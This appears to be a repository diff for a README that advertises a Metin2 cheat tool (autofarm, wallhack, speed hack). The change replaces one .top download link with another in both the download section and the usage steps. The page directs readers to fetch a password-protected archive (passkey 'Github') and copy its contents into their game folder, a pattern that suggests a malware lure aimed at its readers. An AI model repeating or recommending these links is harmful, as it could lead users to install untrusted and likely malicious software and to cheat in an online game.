@@ -6,7 +6,7 @@ Metin2 hack with AutoFarm, ESP wallhack, speed hack, skill hack, auto-loot, auto
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -79,7 +79,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Backup your game files before copying anything.
 4. Copy files to your Metin2 folder.
